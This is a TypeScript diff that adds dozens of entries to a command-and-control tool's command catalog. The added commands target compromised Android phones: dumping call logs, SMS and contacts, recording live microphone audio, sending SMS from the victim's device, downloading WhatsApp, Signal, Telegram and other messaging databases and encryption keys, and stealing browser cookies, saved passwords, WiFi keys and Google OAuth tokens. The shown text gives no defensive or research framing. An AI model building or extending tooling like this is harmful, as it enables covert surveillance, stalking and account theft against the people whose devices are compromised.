@@ -183,6 +183,67 @@ const COMMAND_CATALOG: C2Command[] = [
   { id: "win_enum_domain",  name: "run post/windows/gather/enum_domain",                   category: "Windows", description: "Enumerate Active Directory domain" },
   { id: "win_reg_dump",     name: "run post/windows/gather/registry_persistence",          category: "Windows", description: "Dump registry hives" },
   { id: "linux_wifi",       name: "run post/linux/gather/wifi_credentials",                category: "Windows", description: "Dump WiFi credentials (Linux)" },
+
+  // ── Communications / Phone Calls ───────────────────────────
+  { id: "call_log",              name: "dump_calllog",                                                        category: "Comms",     description: "Dump full call log history" },
+  { id: "call_log_recent",       name: "run post/android/gather/sub_info",                                   category: "Comms",     description: "Get subscriber info + phone number" },
+  { id: "call_record_live",      name: "record_mic -d 300",                                                   category: "Comms",     description: "Record 5 min of live audio (calls/ambient)", needsParam: true, paramLabel: "Duration (s)", paramPlaceholder: "300" },
+  { id: "sms_dump",              name: "dump_sms",                                                            category: "Comms",     description: "Dump all SMS / MMS messages" },
+  { id: "sms_send",              name: "send_sms",                                                            category: "Comms",     description: "Send SMS from target device", needsParam: true, paramLabel: "number:message", paramPlaceholder: "+15551234:test" },
+  { id: "contacts_dump",         name: "dump_contacts",                                                       category: "Comms",     description: "Dump full contact book" },
+  { id: "voip_capture",          name: "record_mic -d 600",                                                   category: "Comms",     description: "Capture 10 min VoIP / call audio" },
+  { id: "sim_info",              name: "run post/android/gather/sub_info",                                    category: "Comms",     description: "Get IMSI, carrier, phone number" },
+  { id: "imei_imsi",             name: "run post/android/gather/device_info",                                 category: "Comms",     description: "Get IMEI / IMSI / serial number" },
+  { id: "mobile_accounts",       name: "run post/android/gather/accounts",                                    category: "Comms",     description: "List all Google / device accounts" },
+
+  // ── Social Media — WhatsApp ───────────────────────────────
+  { id: "whatsapp_msgs",         name: "download /data/data/com.whatsapp/databases/msgstore.db",             category: "Social",    description: "Download WhatsApp message DB (root)" },
+  { id: "whatsapp_contacts",     name: "download /data/data/com.whatsapp/databases/wa.db",                   category: "Social",    description: "Download WhatsApp contact DB" },
+  { id: "whatsapp_key",          name: "download /data/data/com.whatsapp/files/key",                         category: "Social",    description: "Download WhatsApp encryption key (root)" },
+  { id: "whatsapp_media",        name: "download -r /sdcard/WhatsApp/Media",                                 category: "Social",    description: "Download all WhatsApp media files" },
+  { id: "whatsapp_appdata",      name: "run post/android/capture/app_data -p com.whatsapp",                 category: "Social",    description: "Full WhatsApp app data extraction" },
+  { id: "whatsapp_biz",          name: "run post/android/capture/app_data -p com.whatsapp.w4b",             category: "Social",    description: "WhatsApp Business app data" },
+
+  // ── Social Media — Telegram ───────────────────────────────
+  { id: "telegram_msgs",         name: "download /data/data/org.telegram.messenger/files/cache4.db",        category: "Social",    description: "Download Telegram message cache DB" },
+  { id: "telegram_appdata",      name: "run post/android/capture/app_data -p org.telegram.messenger",       category: "Social",    description: "Full Telegram app data extraction" },
+
+  // ── Social Media — Signal ─────────────────────────────────
+  { id: "signal_db",             name: "download /data/data/org.thoughtcrime.securesms/databases/signal.db",category: "Social",    description: "Download Signal DB (root required)" },
+  { id: "signal_appdata",        name: "run post/android/capture/app_data -p org.thoughtcrime.securesms",   category: "Social",    description: "Signal full app data (root)" },
+
+  // ── Social Media — Facebook / Instagram ───────────────────
+  { id: "fb_messenger",          name: "download /data/data/com.facebook.orca/databases/threads_db2",       category: "Social",    description: "Download Facebook Messenger DB" },
+  { id: "fb_appdata",            name: "run post/android/capture/app_data -p com.facebook.orca",            category: "Social",    description: "Facebook Messenger full data" },
+  { id: "instagram_db",          name: "download /data/data/com.instagram.android/databases/direct.db",     category: "Social",    description: "Download Instagram DM database" },
+  { id: "instagram_appdata",     name: "run post/android/capture/app_data -p com.instagram.android",        category: "Social",    description: "Instagram full app data" },
+
+  // ── Social Media — Snapchat / TikTok / Twitter ───────────
+  { id: "snapchat_db",           name: "download /data/data/com.snapchat.android/databases/main.db",        category: "Social",    description: "Download Snapchat database" },
+  { id: "snapchat_appdata",      name: "run post/android/capture/app_data -p com.snapchat.android",         category: "Social",    description: "Snapchat full app data" },
+  { id: "tiktok_db",             name: "download /data/data/com.zhiliaoapp.musically/databases/IM.db",      category: "Social",    description: "Download TikTok IM database" },
+  { id: "twitter_db",            name: "download /data/data/com.twitter.android/databases/app.db",          category: "Social",    description: "Download Twitter/X database" },
+  { id: "twitter_appdata",       name: "run post/android/capture/app_data -p com.twitter.android",          category: "Social",    description: "Twitter/X full app data" },
+
+  // ── Social Media — Discord / Viber / WeChat / Line ───────
+  { id: "discord_db",            name: "download /data/data/com.discord/databases/",                        category: "Social",    description: "Download Discord local databases" },
+  { id: "viber_db",              name: "download /data/data/com.viber.voip/databases/",                     category: "Social",    description: "Download Viber databases" },
+  { id: "wechat_db",             name: "download /data/data/com.tencent.mm/MicroMsg/",                      category: "Social",    description: "Download WeChat databases (root)" },
+  { id: "line_db",               name: "download /data/data/jp.naver.line.android/databases/naver_line",    category: "Social",    description: "Download Line message database" },
+  { id: "skype_db",              name: "download /data/data/com.skype.raider/databases/",                   category: "Social",    description: "Download Skype databases" },
+  { id: "linkedin_db",           name: "download /data/data/com.linkedin.android/databases/",              category: "Social",    description: "Download LinkedIn databases" },
+
+  // ── Email / Google ─────────────────────────────────────────
+  { id: "gmail_db",              name: "download /data/data/com.google.android.gm/databases/",              category: "Social",    description: "Download Gmail databases" },
+  { id: "gmsg_db",               name: "download /data/data/com.google.android.apps.messaging/databases/bugle_db", category: "Social", description: "Download Google Messages DB" },
+  { id: "accounts_list",         name: "run post/android/gather/accounts",                                   category: "Social",    description: "List all synced accounts (Google, etc.)" },
+
+  // ── Advanced COMMS Intel ──────────────────────────────────
+  { id: "browser_cookies",       name: "run post/multi/gather/browser_cookies",                             category: "Social",    description: "Steal all browser session cookies" },
+  { id: "saved_passwords",       name: "run post/multi/gather/browser_credentials",                         category: "Social",    description: "Dump all saved browser passwords" },
+  { id: "wifi_passwords",        name: "run post/multi/gather/wifi_credentials",                            category: "Social",    description: "Dump all saved WiFi passwords" },
+  { id: "google_auth_tokens",    name: "run post/android/gather/accounts",                                   category: "Social",    description: "Capture Google OAuth tokens" },
+  { id: "app_sandbox_all",       name: "run post/android/capture/app_data",                                  category: "Social",    description: "Extract all installed app sandboxes (root)" },
 ];
 
 export function getCommandsByCategory(): Record<string, C2Command[]> {
